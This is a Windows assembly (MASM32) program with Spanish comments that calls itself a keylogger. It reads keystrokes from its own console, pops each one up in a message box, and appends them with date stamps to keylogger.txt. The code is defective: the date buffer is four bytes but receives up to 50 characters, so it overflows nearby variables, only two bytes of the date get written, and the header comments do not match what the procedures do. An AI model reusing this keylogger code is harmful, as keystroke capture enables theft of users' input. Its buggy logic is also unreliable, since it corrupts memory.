.386
;model
.model flat, stdcall				;flat es como small
option casemap:none
;includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
;librerias
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib
INCLUDE \masm32\include\DateTime.inc
INCLUDELIB \masm32\lib\DateTime.lib

WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
;data segment
.data
	stUtc SYSTEMTIME<>; Local Time
	dtUtc SYSTEMTIME<>
	dateformat  db " dddd, MMMM, dd, yyyy", 0
	timeformat db "hh:mm:ss tt",0
	directorio byte "keylogger.txt",NULL
	error1 db "No se pudo crear el archivo",0
	inicio db "Keylogger iniciado", 10, 0
	continuacion db "Presione una tecla para continaur", 10, 0
	slash dw "/",NULL
	puntos dw ":",NULL
.data?
	fecha dd ?
	manejo dd ?
	key dd ?
	bytesw dd ?
;code segment
.code
program:
	call main
	main proc
		LOCAl systime:SYSTEMTIME
		INVOKE StdOut, addr inicio
		INVOKE StdOut, addr continuacion

		mov edx, offset directorio
		
		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
		INVOKE SetFilePointer, eax, 0, 0, FILE_END

		mov manejo, eax
		cmp eax, INVALID_HANDLE_VALUE	;Error de creacion del archivo
		je fin_programa

		keylogger:

		call crt__getch
		mov key, eax
		cmp eax, 0
		je seguir

		;invoke GetKeyNameTextA, WM_CHAR, addr key, 64
		invoke MessageBox,NULL,addr key,addr key,MB_OK

		;invoke StdIn, addr key, 1
		
		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
		INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL
		mov eax, manejo
		INVOKE CloseHandle, eax

		mov ebx, key						;moviendo la entrada a la variable "key"
		cmp ebx, 20h						;si es un espacio
		jz ObtenerFH
		cmp ebx, 0ah						;si es un ENTER
		jz ObtenerFH
		jmp seguir							;de lo contrario, sigue leyendo teclado

		ObtenerFH:
			INVOKE GetDateFormat, 0, 0, \
				0, addr dateformat, addr fecha, 50
			mov ecx, offset fecha
			add ecx, eax 
			mov byte ptr [ecx-1], " "
			INVOKE GetTimeFormat, 0, 0, \
				0, addr timeformat, ecx, 20
			INVOKE MessageBox, 0, addr fecha, addr fecha, MB_OK
			Call EscribirArchivo

		seguir:
		;invoke StdOut, addr key
		jmp keylogger


		fin_programa:
		invoke ExitProcess,0
	main endp

	EscribirArchivo PROC
		;
		; Writes a buffer to an output file.
		; Receives: EAX = file handle, EDX = buffer offset,
		; ECX = number of bytes to write
		; Returns: EAX = number of bytes written to the file.
		; If the value returned in EAX is less than the
		; argument passed in ECX, an error likely occurred.
		;--------------------------------------------------------

		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
		INVOKE WriteFile,manejo,addr fecha,2,addr bytesw,0
		mov eax, manejo
		INVOKE CloseHandle, eax
		ret
	EscribirArchivo ENDP

	LeerArchivo PROC
		;
		; Reads an input file into a buffer.
		; Receives: EAX = file handle, EDX = buffer offset,
		; ECX = number of bytes to read
		; Returns: If CF = 0, EAX = number of bytes read; if
		; CF = 1, EAX contains the system error code returned
		; by the GetLastError Win32 API function.
		;--------------------------------------------------------
		.data
		ReadFromFile_1 DWORD ? ; number of bytes read
		.code
		INVOKE ReadFile,
		eax, ; file handle
		edx, ; buffer pointer
		ecx, ; max bytes to read
		ADDR ReadFromFile_1, ; number of bytes read
		0 ; overlapped execution flag
		mov eax,ReadFromFile_1
		ret
	LeerArchivo ENDP
end program

